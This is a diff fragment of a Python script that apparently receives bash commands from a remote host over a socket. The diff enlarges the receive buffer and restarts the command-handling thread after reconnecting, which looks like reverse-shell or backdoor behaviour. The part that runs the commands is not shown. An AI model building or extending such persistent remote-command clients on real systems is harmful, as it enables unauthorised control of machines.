@@ -86,7 +86,7 @@ def control():
             break
     
     try:
-      bashCommand = client.recv(2048).decode(FORMAT)
+      bashCommand = client.recv(4096).decode(FORMAT)
       
   
       #print('1')
@@ -133,9 +133,19 @@ def reconnect():
           
           if DEBUG:
             print(f'{bcolors.OKGREEN}[CONNECTED] Connected to host{bcolors.ENDC}')
+          if startThread == True:
+            thread2 = threading.Thread(target=control)
+            thread2.start()
+            startThread = False
+            stop_threads = False
+            
+          
             
           
         except:
+          if DEBUG:
+            print(f'{bcolors.WARNING}[WARN] Failed To Reconnect{bcolors.ENDC}')
+          
 while True:
     try: 
       if firstConnect == True:
